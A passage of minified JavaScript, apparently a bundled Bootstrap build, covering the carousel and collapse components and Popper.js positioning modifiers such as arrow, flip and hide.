target=SelectorEngine.getElementFromSelector(this);if(!target||!target.classList.contains(CLASS_NAME_CAROUSEL))return;event.preventDefault();const carousel=Carousel.getOrCreateInstance(target),slideIndex=this.getAttribute("data-bs-slide-to");if(slideIndex){carousel.to(slideIndex),carousel._maybeEnableCycle();return}if(Manipulator.getDataAttribute(this,"slide")==="next"){carousel.next(),carousel._maybeEnableCycle();return}carousel.prev(),carousel._maybeEnableCycle()}),EventHandler.on(window,EVENT_LOAD_DATA_API$3,()=>{const carousels=SelectorEngine.find(SELECTOR_DATA_RIDE);for(const carousel of carousels)Carousel.getOrCreateInstance(carousel)}),defineJQueryPlugin(Carousel);const NAME$b="collapse",DATA_KEY$7="bs.collapse",EVENT_KEY$7=`.${DATA_KEY$7}`,DATA_API_KEY$4=".data-api",EVENT_SHOW$6=`show${EVENT_KEY$7}`,EVENT_SHOWN$6=`shown${EVENT_KEY$7}`,EVENT_HIDE$6=`hide${EVENT_KEY$7}`,EVENT_HIDDEN$6=`hidden${EVENT_KEY$7}`,EVENT_CLICK_DATA_API$4=`click${EVENT_KEY$7}${DATA_API_KEY$4}`,CLASS_NAME_SHOW$7="show",CLASS_NAME_COLLAPSE="collapse",CLASS_NAME_COLLAPSING="collapsing",CLASS_NAME_COLLAPSED="collapsed",CLASS_NAME_DEEPER_CHILDREN=`:scope .${CLASS_NAME_COLLAPSE} .${CLASS_NAME_COLLAPSE}`,CLASS_NAME_HORIZONTAL="collapse-horizontal",WIDTH="width",HEIGHT="height",SELECTOR_ACTIVES=".collapse.show, .collapse.collapsing",SELECTOR_DATA_TOGGLE$4='[data-bs-toggle="collapse"]',Default$a={parent:null,toggle:!0},DefaultType$a={parent:"(null|element)",toggle:"boolean"};class Collapse extends BaseComponent{constructor(element,config){super(element,config),this._isTransitioning=!1,this._triggerArray=[];const toggleList=SelectorEngine.find(SELECTOR_DATA_TOGGLE$4);for(const elem of toggleList){const selector=SelectorEngine.getSelectorFromElement(elem),filterElement=SelectorEngine.find(selector).filter(foundElement=>foundElement===this._element);selector!==null&&filterElement.length&&this._triggerArray.push(elem)}this._initializeChildren(),this._config.parent||this._addAriaAndCollapsedClass(this._triggerArray,this._isShown()),this._config.toggle&&this.toggle()}static get Default(){return Default$a}static get DefaultType(){return DefaultType$a}static get NAME(){return NAME$b}toggle(){this._isShown()?this.hide():this.show()}show(){if(this._isTransitioning||this._isShown())return;let activeChildren=[];if(this._config.parent&&(activeChildren=this._getFirstLevelChildren(SELECTOR_ACTIVES).filter(element=>element!==this._element).map(element=>Collapse.getOrCreateInstance(element,{toggle:!1}))),activeChildren.length&&activeChildren[0]._isTransitioning)return;const startEvent=EventHandler.trigger(this._element,EVENT_SHOW$6);if(startEvent.defaultPrevented)return;for(const activeInstance of activeChildren)activeInstance.hide();const dimension=this._getDimension();this._element.classList.remove(CLASS_NAME_COLLAPSE),this._element.classList.add(CLASS_NAME_COLLAPSING),this._element.style[dimension]=0,this._addAriaAndCollapsedClass(this._triggerArray,!0),this._isTransitioning=!0;const complete=()=>{this._isTransitioning=!1,this._element.classList.remove(CLASS_NAME_COLLAPSING),this._element.classList.add(CLASS_NAME_COLLAPSE,CLASS_NAME_SHOW$7),this._element.style[dimension]="",EventHandler.trigger(this._element,EVENT_SHOWN$6)},capitalizedDimension=dimension[0].toUpperCase()+dimension.slice(1),scrollSize=`scroll${capitalizedDimension}`;this._queueCallback(complete,this._element,!0),this._element.style[dimension]=`${this._element[scrollSize]}px`}hide(){if(this._isTransitioning||!this._isShown())return;const startEvent=EventHandler.trigger(this._element,EVENT_HIDE$6);if(startEvent.defaultPrevented)return;const dimension=this._getDimension();this._element.style[dimension]=`${this._element.getBoundingClientRect()[dimension]}px`,reflow(this._element),this._element.classList.add(CLASS_NAME_COLLAPSING),this._element.classList.remove(CLASS_NAME_COLLAPSE,CLASS_NAME_SHOW$7);for(const trigger of this._triggerArray){const element=SelectorEngine.getElementFromSelector(trigger);element&&!this._isShown(element)&&this._addAriaAndCollapsedClass([trigger],!1)}this._isTransitioning=!0;const complete=()=>{this._isTransitioning=!1,this._element.classList.remove(CLASS_NAME_COLLAPSING),this._element.classList.add(CLASS_NAME_COLLAPSE),EventHandler.trigger(this._element,EVENT_HIDDEN$6)};this._element.style[dimension]="",this._queueCallback(complete,this._element,!0)}_isShown(element=this._element){return element.classList.contains(CLASS_NAME_SHOW$7)}_configAfterMerge(config){return config.toggle=Boolean(config.toggle),config.parent=getElement(config.parent),config}_getDimension(){return this._element.classList.contains(CLASS_NAME_HORIZONTAL)?WIDTH:HEIGHT}_initializeChildren(){if(!this._config.parent)return;const children=this._getFirstLevelChildren(SELECTOR_DATA_TOGGLE$4);for(const element of children){const selected=SelectorEngine.getElementFromSelector(element);selected&&this._addAriaAndCollapsedClass([element],this._isShown(selected))}}_getFirstLevelChildren(selector){const children=SelectorEngine.find(CLASS_NAME_DEEPER_CHILDREN,this._config.parent);return SelectorEngine.find(selector,this._config.parent).filter(element=>!children.includes(element))}_addAriaAndCollapsedClass(triggerArray,isOpen){if(!triggerArray.length)return;for(const element of triggerArray)element.classList.toggle(CLASS_NAME_COLLAPSED,!isOpen),element.setAttribute("aria-expanded",isOpen)}static jQueryInterface(config){const _config={};return typeof config=="string"&&/show|hide/.test(config)&&(_config.toggle=!1),this.each(function(){const data=Collapse.getOrCreateInstance(this,_config);if(typeof config=="string"){if(typeof data[config]=="undefined")throw new TypeError(`No method named "${config}"`);data[config]()}})}}EventHandler.on(document,EVENT_CLICK_DATA_API$4,SELECTOR_DATA_TOGGLE$4,function(event){(event.target.tagName==="A"||event.delegateTarget&&event.delegateTarget.tagName==="A")&&event.preventDefault();for(const element of SelectorEngine.getMultipleElementsFromSelector(this))Collapse.getOrCreateInstance(element,{toggle:!1}).toggle()}),defineJQueryPlugin(Collapse);var top="top",bottom="bottom",right="right",left="left",auto="auto",basePlacements=[top,bottom,right,left],start="start",end="end",clippingParents="clippingParents",viewport="viewport",popper="popper",reference="reference",variationPlacements=basePlacements.reduce(function(acc,placement){return acc.concat([placement+"-"+start,placement+"-"+end])},[]),placements=[].concat(basePlacements,[auto]).reduce(function(acc,placement){return acc.concat([placement,placement+"-"+start,placement+"-"+end])},[]),beforeRead="beforeRead",read="read",afterRead="afterRead",beforeMain="beforeMain",main="main",afterMain="afterMain",beforeWrite="beforeWrite",write="write",afterWrite="afterWrite",modifierPhases=[beforeRead,read,afterRead,beforeMain,main,afterMain,beforeWrite,write,afterWrite];function getNodeName(element){return element?(element.nodeName||"").toLowerCase():null}function getWindow(node){if(node==null)return window;if(node.toString()!=="[object Window]"){var ownerDocument=node.ownerDocument;return ownerDocument?ownerDocument.defaultView||window:window}return node}function isElement(node){var OwnElement=getWindow(node).Element;return node instanceof OwnElement||node instanceof Element}function isHTMLElement(node){var OwnElement=getWindow(node).HTMLElement;return node instanceof OwnElement||node instanceof HTMLElement}function isShadowRoot(node){if(typeof ShadowRoot=="undefined")return!1;var OwnElement=getWindow(node).ShadowRoot;return node instanceof OwnElement||node instanceof ShadowRoot}function applyStyles(_ref){var state=_ref.state;Object.keys(state.elements).forEach(function(name){var style=state.styles[name]||{},attributes=state.attributes[name]||{},element=state.elements[name];if(!isHTMLElement(element)||!getNodeName(element))return;Object.assign(element.style,style),Object.keys(attributes).forEach(function(name){var value=attributes[name];value===!1?element.removeAttribute(name):element.setAttribute(name,value===!0?"":value)})})}function effect$2(_ref2){var state=_ref2.state,initialStyles={popper:{position:state.options.strategy,left:"0",top:"0",margin:"0"},arrow:{position:"absolute"},reference:{}};return Object.assign(state.elements.popper.style,initialStyles.popper),state.styles=initialStyles,state.elements.arrow&&Object.assign(state.elements.arrow.style,initialStyles.arrow),function(){Object.keys(state.elements).forEach(function(name){var element=state.elements[name],attributes=state.attributes[name]||{},styleProperties=Object.keys(state.styles.hasOwnProperty(name)?state.styles[name]:initialStyles[name]),style=styleProperties.reduce(function(style,property){return style[property]="",style},{});if(!isHTMLElement(element)||!getNodeName(element))return;Object.assign(element.style,style),Object.keys(attributes).forEach(function(attribute){element.removeAttribute(attribute)})})}}const applyStyles$1={name:"applyStyles",enabled:!0,phase:"write",fn:applyStyles,effect:effect$2,requires:["computeStyles"]};function getBasePlacement(placement){return placement.split("-")[0]}var max=Math.max,min=Math.min,round=Math.round;function getUAString(){var uaData=navigator.userAgentData;return uaData!=null&&uaData.brands&&Array.isArray(uaData.brands)?uaData.brands.map(function(item){return item.brand+"/"+item.version}).join(" "):navigator.userAgent}function isLayoutViewport(){return!/^((?!chrome|android).)*safari/i.test(getUAString())}function getBoundingClientRect(element,includeScale,isFixedStrategy){includeScale===void 0&&(includeScale=!1),isFixedStrategy===void 0&&(isFixedStrategy=!1);var clientRect=element.getBoundingClientRect(),scaleX=1,scaleY=1;includeScale&&isHTMLElement(element)&&(scaleX=element.offsetWidth>0?round(clientRect.width)/element.offsetWidth||1:1,scaleY=element.offsetHeight>0?round(clientRect.height)/element.offsetHeight||1:1);var _ref=isElement(element)?getWindow(element):window,visualViewport=_ref.visualViewport,addVisualOffsets=!isLayoutViewport()&&isFixedStrategy,x=(clientRect.left+(addVisualOffsets&&visualViewport?visualViewport.offsetLeft:0))/scaleX,y=(clientRect.top+(addVisualOffsets&&visualViewport?visualViewport.offsetTop:0))/scaleY,width=clientRect.width/scaleX,height=clientRect.height/scaleY;return{width,height,top:y,right:x+width,bottom:y+height,left:x,x,y}}function getLayoutRect(element){var clientRect=getBoundingClientRect(element),width=element.offsetWidth,height=element.offsetHeight;return Math.abs(clientRect.width-width)<=1&&(width=clientRect.width),Math.abs(clientRect.height-height)<=1&&(height=clientRect.height),{x:element.offsetLeft,y:element.offsetTop,width,height}}function contains(parent,child){var rootNode=child.getRootNode&&child.getRootNode();if(parent.contains(child))return!0;if(rootNode&&isShadowRoot(rootNode)){var next=child;do{if(next&&parent.isSameNode(next))return!0;next=next.parentNode||next.host}while(next)}return!1}function getComputedStyle$1(element){return getWindow(element).getComputedStyle(element)}function isTableElement(element){return["table","td","th"].indexOf(getNodeName(element))>=0}function getDocumentElement(element){return((isElement(element)?element.ownerDocument:element.document)||window.document).documentElement}function getParentNode(element){return getNodeName(element)==="html"?element:element.assignedSlot||element.parentNode||(isShadowRoot(element)?element.host:null)||getDocumentElement(element)}function getTrueOffsetParent(element){return!isHTMLElement(element)||getComputedStyle$1(element).position==="fixed"?null:element.offsetParent}function getContainingBlock(element){var isFirefox=/firefox/i.test(getUAString()),isIE=/Trident/i.test(getUAString());if(isIE&&isHTMLElement(element)){var elementCss=getComputedStyle$1(element);if(elementCss.position==="fixed")return null}var css,currentNode=getParentNode(element);for(isShadowRoot(currentNode)&&(currentNode=currentNode.host);isHTMLElement(currentNode)&&["html","body"].indexOf(getNodeName(currentNode))<0;){if(css=getComputedStyle$1(currentNode),css.transform!=="none"||css.perspective!=="none"||css.contain==="paint"||["transform","perspective"].indexOf(css.willChange)!==-1||isFirefox&&css.willChange==="filter"||isFirefox&&css.filter&&css.filter!=="none")return currentNode;currentNode=currentNode.parentNode}return null}function getOffsetParent(element){for(var window=getWindow(element),offsetParent=getTrueOffsetParent(element);offsetParent&&isTableElement(offsetParent)&&getComputedStyle$1(offsetParent).position==="static";)offsetParent=getTrueOffsetParent(offsetParent);return offsetParent&&(getNodeName(offsetParent)==="html"||getNodeName(offsetParent)==="body"&&getComputedStyle$1(offsetParent).position==="static")?window:offsetParent||getContainingBlock(element)||window}function getMainAxisFromPlacement(placement){return["top","bottom"].indexOf(placement)>=0?"x":"y"}function within(min$1,value,max$1){return max(min$1,min(value,max$1))}function withinMaxClamp(min,value,max){var v=within(min,value,max);return v>max?max:v}function getFreshSideObject(){return{top:0,right:0,bottom:0,left:0}}function mergePaddingObject(paddingObject){return Object.assign({},getFreshSideObject(),paddingObject)}function expandToHashMap(value,keys){return keys.reduce(function(hashMap,key){return hashMap[key]=value,hashMap},{})}var toPaddingObject=function(padding,state){return padding=typeof padding=="function"?padding(Object.assign({},state.rects,{placement:state.placement})):padding,mergePaddingObject(typeof padding!="number"?padding:expandToHashMap(padding,basePlacements))};function arrow(_ref){var _state$modifiersData$,state=_ref.state,name=_ref.name,options=_ref.options,arrowElement=state.elements.arrow,popperOffsets=state.modifiersData.popperOffsets,basePlacement=getBasePlacement(state.placement),axis=getMainAxisFromPlacement(basePlacement),isVertical=[left,right].indexOf(basePlacement)>=0,len=isVertical?"height":"width";if(!arrowElement||!popperOffsets)return;var paddingObject=toPaddingObject(options.padding,state),arrowRect=getLayoutRect(arrowElement),minProp=axis==="y"?top:left,maxProp=axis==="y"?bottom:right,endDiff=state.rects.reference[len]+state.rects.reference[axis]-popperOffsets[axis]-state.rects.popper[len],startDiff=popperOffsets[axis]-state.rects.reference[axis],arrowOffsetParent=getOffsetParent(arrowElement),clientSize=arrowOffsetParent?axis==="y"?arrowOffsetParent.clientHeight||0:arrowOffsetParent.clientWidth||0:0,centerToReference=endDiff/2-startDiff/2,min=paddingObject[minProp],max=clientSize-arrowRect[len]-paddingObject[maxProp],center=clientSize/2-arrowRect[len]/2+centerToReference,offset=within(min,center,max),axisProp=axis;state.modifiersData[name]=(_state$modifiersData$={},_state$modifiersData$[axisProp]=offset,_state$modifiersData$.centerOffset=offset-center,_state$modifiersData$)}function effect$1(_ref2){var state=_ref2.state,options=_ref2.options,_options$element=options.element,arrowElement=_options$element===void 0?"[data-popper-arrow]":_options$element;if(arrowElement==null)return;if(typeof arrowElement=="string"&&(arrowElement=state.elements.popper.querySelector(arrowElement),!arrowElement))return;if(!contains(state.elements.popper,arrowElement))return;state.elements.arrow=arrowElement}const arrow$1={name:"arrow",enabled:!0,phase:"main",fn:arrow,effect:effect$1,requires:["popperOffsets"],requiresIfExists:["preventOverflow"]};function getVariation(placement){return placement.split("-")[1]}var unsetSides={top:"auto",right:"auto",bottom:"auto",left:"auto"};function roundOffsetsByDPR(_ref,win){var x=_ref.x,y=_ref.y,dpr=win.devicePixelRatio||1;return{x:round(x*dpr)/dpr||0,y:round(y*dpr)/dpr||0}}function mapToStyles(_ref2){var _Object$assign2,_Object$assign,popper=_ref2.popper,popperRect=_ref2.popperRect,placement=_ref2.placement,variation=_ref2.variation,offsets=_ref2.offsets,position=_ref2.position,gpuAcceleration=_ref2.gpuAcceleration,adaptive=_ref2.adaptive,roundOffsets=_ref2.roundOffsets,isFixed=_ref2.isFixed,_offsets$x=offsets.x,x=_offsets$x===void 0?0:_offsets$x,_offsets$y=offsets.y,y=_offsets$y===void 0?0:_offsets$y,_ref3=typeof roundOffsets=="function"?roundOffsets({x,y}):{x,y},x=_ref3.x,y=_ref3.y,hasX=offsets.hasOwnProperty("x"),hasY=offsets.hasOwnProperty("y"),sideX=left,sideY=top,win=window;if(adaptive){var offsetParent=getOffsetParent(popper),heightProp="clientHeight",widthProp="clientWidth";if(offsetParent===getWindow(popper)&&(offsetParent=getDocumentElement(popper),getComputedStyle$1(offsetParent).position!=="static"&&position==="absolute"&&(heightProp="scrollHeight",widthProp="scrollWidth")),offsetParent=offsetParent,placement===top||(placement===left||placement===right)&&variation===end){sideY=bottom;var offsetY=isFixed&&offsetParent===win&&win.visualViewport?win.visualViewport.height:offsetParent[heightProp];y-=offsetY-popperRect.height,y*=gpuAcceleration?1:-1}if(placement===left||(placement===top||placement===bottom)&&variation===end){sideX=right;var offsetX=isFixed&&offsetParent===win&&win.visualViewport?win.visualViewport.width:offsetParent[widthProp];x-=offsetX-popperRect.width,x*=gpuAcceleration?1:-1}}var commonStyles=Object.assign({position},adaptive&&unsetSides),_ref4=roundOffsets===!0?roundOffsetsByDPR({x,y},getWindow(popper)):{x,y},x=_ref4.x,y=_ref4.y;return gpuAcceleration?Object.assign({},commonStyles,(_Object$assign={},_Object$assign[sideY]=hasY?"0":"",_Object$assign[sideX]=hasX?"0":"",_Object$assign.transform=(win.devicePixelRatio||1)<=1?"translate("+x+"px, "+y+"px)":"translate3d("+x+"px, "+y+"px, 0)",_Object$assign)):Object.assign({},commonStyles,(_Object$assign2={},_Object$assign2[sideY]=hasY?y+"px":"",_Object$assign2[sideX]=hasX?x+"px":"",_Object$assign2.transform="",_Object$assign2))}function computeStyles(_ref5){var state=_ref5.state,options=_ref5.options,_options$gpuAccelerat=options.gpuAcceleration,gpuAcceleration=_options$gpuAccelerat===void 0||_options$gpuAccelerat,_options$adaptive=options.adaptive,adaptive=_options$adaptive===void 0||_options$adaptive,_options$roundOffsets=options.roundOffsets,roundOffsets=_options$roundOffsets===void 0||_options$roundOffsets,commonStyles={placement:getBasePlacement(state.placement),variation:getVariation(state.placement),popper:state.elements.popper,popperRect:state.rects.popper,gpuAcceleration,isFixed:state.options.strategy==="fixed"};state.modifiersData.popperOffsets!=null&&(state.styles.popper=Object.assign({},state.styles.popper,mapToStyles(Object.assign({},commonStyles,{offsets:state.modifiersData.popperOffsets,position:state.options.strategy,adaptive,roundOffsets})))),state.modifiersData.arrow!=null&&(state.styles.arrow=Object.assign({},state.styles.arrow,mapToStyles(Object.assign({},commonStyles,{offsets:state.modifiersData.arrow,position:"absolute",adaptive:!1,roundOffsets})))),state.attributes.popper=Object.assign({},state.attributes.popper,{"data-popper-placement":state.placement})}const computeStyles$1={name:"computeStyles",enabled:!0,phase:"beforeWrite",fn:computeStyles,data:{}};var passive={passive:!0};function effect(_ref){var state=_ref.state,instance=_ref.instance,options=_ref.options,_options$scroll=options.scroll,scroll=_options$scroll===void 0||_options$scroll,_options$resize=options.resize,resize=_options$resize===void 0||_options$resize,window=getWindow(state.elements.popper),scrollParents=[].concat(state.scrollParents.reference,state.scrollParents.popper);return scroll&&scrollParents.forEach(function(scrollParent){scrollParent.addEventListener("scroll",instance.update,passive)}),resize&&window.addEventListener("resize",instance.update,passive),function(){scroll&&scrollParents.forEach(function(scrollParent){scrollParent.removeEventListener("scroll",instance.update,passive)}),resize&&window.removeEventListener("resize",instance.update,passive)}}const eventListeners={name:"eventListeners",enabled:!0,phase:"write",fn:function(){},effect,data:{}};var hash$1={left:"right",right:"left",bottom:"top",top:"bottom"};function getOppositePlacement(placement){return placement.replace(/left|right|bottom|top/g,function(matched){return hash$1[matched]})}var hash={start:"end",end:"start"};function getOppositeVariationPlacement(placement){return placement.replace(/start|end/g,function(matched){return hash[matched]})}function getWindowScroll(node){var win=getWindow(node),scrollLeft=win.pageXOffset,scrollTop=win.pageYOffset;return{scrollLeft,scrollTop}}function getWindowScrollBarX(element){return getBoundingClientRect(getDocumentElement(element)).left+getWindowScroll(element).scrollLeft}function getViewportRect(element,strategy){var win=getWindow(element),html=getDocumentElement(element),visualViewport=win.visualViewport,width=html.clientWidth,height=html.clientHeight,x=0,y=0;if(visualViewport){width=visualViewport.width,height=visualViewport.height;var layoutViewport=isLayoutViewport();(layoutViewport||!layoutViewport&&strategy==="fixed")&&(x=visualViewport.offsetLeft,y=visualViewport.offsetTop)}return{width,height,x:x+getWindowScrollBarX(element),y}}function getDocumentRect(element){var _element$ownerDocumen,html=getDocumentElement(element),winScroll=getWindowScroll(element),body=(_element$ownerDocumen=element.ownerDocument)==null?void 0:_element$ownerDocumen.body,width=max(html.scrollWidth,html.clientWidth,body?body.scrollWidth:0,body?body.clientWidth:0),height=max(html.scrollHeight,html.clientHeight,body?body.scrollHeight:0,body?body.clientHeight:0),x=-winScroll.scrollLeft+getWindowScrollBarX(element),y=-winScroll.scrollTop;return getComputedStyle$1(body||html).direction==="rtl"&&(x+=max(html.clientWidth,body?body.clientWidth:0)-width),{width,height,x,y}}function isScrollParent(element){var _getComputedStyle=getComputedStyle$1(element),overflow=_getComputedStyle.overflow,overflowX=_getComputedStyle.overflowX,overflowY=_getComputedStyle.overflowY;return/auto|scroll|overlay|hidden/.test(overflow+overflowY+overflowX)}function getScrollParent(node){return["html","body","#document"].indexOf(getNodeName(node))>=0?node.ownerDocument.body:isHTMLElement(node)&&isScrollParent(node)?node:getScrollParent(getParentNode(node))}function listScrollParents(element,list){list===void 0&&(list=[]);var _element$ownerDocumen,scrollParent=getScrollParent(element),isBody=scrollParent===((_element$ownerDocumen=element.ownerDocument)==null?void 0:_element$ownerDocumen.body),win=getWindow(scrollParent),target=isBody?[win].concat(win.visualViewport||[],isScrollParent(scrollParent)?scrollParent:[]):scrollParent,updatedList=list.concat(target);return isBody?updatedList:updatedList.concat(listScrollParents(getParentNode(target)))}function rectToClientRect(rect){return Object.assign({},rect,{left:rect.x,top:rect.y,right:rect.x+rect.width,bottom:rect.y+rect.height})}function getInnerBoundingClientRect(element,strategy){var rect=getBoundingClientRect(element,!1,strategy==="fixed");return rect.top=rect.top+element.clientTop,rect.left=rect.left+element.clientLeft,rect.bottom=rect.top+element.clientHeight,rect.right=rect.left+element.clientWidth,rect.width=element.clientWidth,rect.height=element.clientHeight,rect.x=rect.left,rect.y=rect.top,rect}function getClientRectFromMixedType(element,clippingParent,strategy){return clippingParent===viewport?rectToClientRect(getViewportRect(element,strategy)):isElement(clippingParent)?getInnerBoundingClientRect(clippingParent,strategy):rectToClientRect(getDocumentRect(getDocumentElement(element)))}function getClippingParents(element){var clippingParents=listScrollParents(getParentNode(element)),canEscapeClipping=["absolute","fixed"].indexOf(getComputedStyle$1(element).position)>=0,clipperElement=canEscapeClipping&&isHTMLElement(element)?getOffsetParent(element):element;return isElement(clipperElement)?clippingParents.filter(function(clippingParent){return isElement(clippingParent)&&contains(clippingParent,clipperElement)&&getNodeName(clippingParent)!=="body"}):[]}function getClippingRect(element,boundary,rootBoundary,strategy){var mainClippingParents=boundary==="clippingParents"?getClippingParents(element):[].concat(boundary),clippingParents=[].concat(mainClippingParents,[rootBoundary]),firstClippingParent=clippingParents[0],clippingRect=clippingParents.reduce(function(accRect,clippingParent){var rect=getClientRectFromMixedType(element,clippingParent,strategy);return accRect.top=max(rect.top,accRect.top),accRect.right=min(rect.right,accRect.right),accRect.bottom=min(rect.bottom,accRect.bottom),accRect.left=max(rect.left,accRect.left),accRect},getClientRectFromMixedType(element,firstClippingParent,strategy));return clippingRect.width=clippingRect.right-clippingRect.left,clippingRect.height=clippingRect.bottom-clippingRect.top,clippingRect.x=clippingRect.left,clippingRect.y=clippingRect.top,clippingRect}function computeOffsets(_ref){var offsets,len,reference=_ref.reference,element=_ref.element,placement=_ref.placement,basePlacement=placement?getBasePlacement(placement):null,variation=placement?getVariation(placement):null,commonX=reference.x+reference.width/2-element.width/2,commonY=reference.y+reference.height/2-element.height/2;switch(basePlacement){case top:offsets={x:commonX,y:reference.y-element.height};break;case bottom:offsets={x:commonX,y:reference.y+reference.height};break;case right:offsets={x:reference.x+reference.width,y:commonY};break;case left:offsets={x:reference.x-element.width,y:commonY};break;default:offsets={x:reference.x,y:reference.y}}var mainAxis=basePlacement?getMainAxisFromPlacement(basePlacement):null;if(mainAxis!=null)switch(len=mainAxis==="y"?"height":"width",variation){case start:offsets[mainAxis]=offsets[mainAxis]-(reference[len]/2-element[len]/2);break;case end:offsets[mainAxis]=offsets[mainAxis]+(reference[len]/2-element[len]/2);break}return offsets}function detectOverflow(state,options){options===void 0&&(options={});var _options=options,_options$placement=_options.placement,placement=_options$placement===void 0?state.placement:_options$placement,_options$strategy=_options.strategy,strategy=_options$strategy===void 0?state.strategy:_options$strategy,_options$boundary=_options.boundary,boundary=_options$boundary===void 0?clippingParents:_options$boundary,_options$rootBoundary=_options.rootBoundary,rootBoundary=_options$rootBoundary===void 0?viewport:_options$rootBoundary,_options$elementConte=_options.elementContext,elementContext=_options$elementConte===void 0?popper:_options$elementConte,_options$altBoundary=_options.altBoundary,altBoundary=_options$altBoundary!==void 0&&_options$altBoundary,_options$padding=_options.padding,padding=_options$padding===void 0?0:_options$padding,paddingObject=mergePaddingObject(typeof padding!="number"?padding:expandToHashMap(padding,basePlacements)),altContext=elementContext===popper?reference:popper,popperRect=state.rects.popper,element=state.elements[altBoundary?altContext:elementContext],clippingClientRect=getClippingRect(isElement(element)?element:element.contextElement||getDocumentElement(state.elements.popper),boundary,rootBoundary,strategy),referenceClientRect=getBoundingClientRect(state.elements.reference),popperOffsets=computeOffsets({reference:referenceClientRect,element:popperRect,strategy:"absolute",placement}),popperClientRect=rectToClientRect(Object.assign({},popperRect,popperOffsets)),elementClientRect=elementContext===popper?popperClientRect:referenceClientRect,overflowOffsets={top:clippingClientRect.top-elementClientRect.top+paddingObject.top,bottom:elementClientRect.bottom-clippingClientRect.bottom+paddingObject.bottom,left:clippingClientRect.left-elementClientRect.left+paddingObject.left,right:elementClientRect.right-clippingClientRect.right+paddingObject.right},offsetData=state.modifiersData.offset;if(elementContext===popper&&offsetData){var offset=offsetData[placement];Object.keys(overflowOffsets).forEach(function(key){var multiply=[right,bottom].indexOf(key)>=0?1:-1,axis=[top,bottom].indexOf(key)>=0?"y":"x";overflowOffsets[key]+=offset[axis]*multiply})}return overflowOffsets}function computeAutoPlacement(state,options){options===void 0&&(options={});var _options=options,placement=_options.placement,boundary=_options.boundary,rootBoundary=_options.rootBoundary,padding=_options.padding,flipVariations=_options.flipVariations,_options$allowedAutoP=_options.allowedAutoPlacements,allowedAutoPlacements=_options$allowedAutoP===void 0?placements:_options$allowedAutoP,variation=getVariation(placement),placements$1=variation?flipVariations?variationPlacements:variationPlacements.filter(function(placement){return getVariation(placement)===variation}):basePlacements,allowedPlacements=placements$1.filter(function(placement){return allowedAutoPlacements.indexOf(placement)>=0});allowedPlacements.length===0&&(allowedPlacements=placements$1);var overflows=allowedPlacements.reduce(function(acc,placement){return acc[placement]=detectOverflow(state,{placement,boundary,rootBoundary,padding})[getBasePlacement(placement)],acc},{});return Object.keys(overflows).sort(function(a,b){return overflows[a]-overflows[b]})}function getExpandedFallbackPlacements(placement){if(getBasePlacement(placement)===auto)return[];var oppositePlacement=getOppositePlacement(placement);return[getOppositeVariationPlacement(placement),oppositePlacement,getOppositeVariationPlacement(oppositePlacement)]}function flip(_ref){var state=_ref.state,options=_ref.options,name=_ref.name;if(state.modifiersData[name]._skip)return;for(var _options$mainAxis=options.mainAxis,checkMainAxis=_options$mainAxis===void 0||_options$mainAxis,_options$altAxis=options.altAxis,checkAltAxis=_options$altAxis===void 0||_options$altAxis,specifiedFallbackPlacements=options.fallbackPlacements,padding=options.padding,boundary=options.boundary,rootBoundary=options.rootBoundary,altBoundary=options.altBoundary,_options$flipVariatio=options.flipVariations,flipVariations=_options$flipVariatio===void 0||_options$flipVariatio,allowedAutoPlacements=options.allowedAutoPlacements,preferredPlacement=state.options.placement,basePlacement=getBasePlacement(preferredPlacement),isBasePlacement=basePlacement===preferredPlacement,fallbackPlacements=specifiedFallbackPlacements||(isBasePlacement||!flipVariations?[getOppositePlacement(preferredPlacement)]:getExpandedFallbackPlacements(preferredPlacement)),placements=[preferredPlacement].concat(fallbackPlacements).reduce(function(acc,placement){return acc.concat(getBasePlacement(placement)===auto?computeAutoPlacement(state,{placement,boundary,rootBoundary,padding,flipVariations,allowedAutoPlacements}):placement)},[]),referenceRect=state.rects.reference,popperRect=state.rects.popper,checksMap=new Map,makeFallbackChecks=!0,firstFittingPlacement=placements[0],i=0;i<placements.length;i++){var placement=placements[i],_basePlacement=getBasePlacement(placement),isStartVariation=getVariation(placement)===start,isVertical=[top,bottom].indexOf(_basePlacement)>=0,len=isVertical?"width":"height",overflow=detectOverflow(state,{placement,boundary,rootBoundary,altBoundary,padding}),mainVariationSide=isVertical?isStartVariation?right:left:isStartVariation?bottom:top;referenceRect[len]>popperRect[len]&&(mainVariationSide=getOppositePlacement(mainVariationSide));var altVariationSide=getOppositePlacement(mainVariationSide),checks=[];if(checkMainAxis&&checks.push(overflow[_basePlacement]<=0),checkAltAxis&&checks.push(overflow[mainVariationSide]<=0,overflow[altVariationSide]<=0),checks.every(function(check){return check})){firstFittingPlacement=placement,makeFallbackChecks=!1;break}checksMap.set(placement,checks)}if(makeFallbackChecks)for(var numberOfChecks=flipVariations?3:1,_loop=function(_i){var fittingPlacement=placements.find(function(placement){var checks=checksMap.get(placement);if(checks)return checks.slice(0,_i).every(function(check){return check})});if(fittingPlacement)return firstFittingPlacement=fittingPlacement,"break"},_i=numberOfChecks;_i>0;_i--){var _ret=_loop(_i);if(_ret==="break")break}state.placement!==firstFittingPlacement&&(state.modifiersData[name]._skip=!0,state.placement=firstFittingPlacement,state.reset=!0)}const flip$1={name:"flip",enabled:!0,phase:"main",fn:flip,requiresIfExists:["offset"],data:{_skip:!1}};function getSideOffsets(overflow,rect,preventedOffsets){return preventedOffsets===void 0&&(preventedOffsets={x:0,y:0}),{top:overflow.top-rect.height-preventedOffsets.y,right:overflow.right-rect.width+preventedOffsets.x,bottom:overflow.bottom-rect.height+preventedOffsets.y,left:overflow.left-rect.width-preventedOffsets.x}}function isAnySideFullyClipped(overflow){return[top,right,bottom,left].some(function(side){return overflow[side]>=0})}function hide(_ref){var state=_ref.state,name=_ref.name,referenceRect=state.rects.reference,popperRect=state.rects.popper,preventedOffsets=state.modifiersData.preventOverflow,referenceOverflow=detectOverflow(state,{elementContext:"reference"}),popperAltOverflow=detectOverflow(state,{altBoundary:!0}),referenceClippingOffsets=getSideOffsets(referenceOverflow,referenceRect),popperEscapeOffsets=getSideOffsets(popperAltOverflow,popperRect,preventedOffsets),isReferenceHidden=isAnySideFullyClipped(referenceClippingOffsets),hasPopperEscaped=isAnySideFullyClipped(popperEscapeOffsets);state.modifiersData[name]={referenceClippingOffsets,popperEscapeOffsets,isReferenceHidden,hasPopperEscaped},state.attributes.popper=Object.assign({},state.attributes.popper,{"data-popper-reference-hidden":isReferenceHidden,"data-popper-escaped":hasPopperEscaped})}const hide$1={name:"hide",enabled:!0,phase:"main",requiresIfExists:["preventOverflow"],fn:hide};function distanceAndSkiddingToXY(placement,rects,offset){var 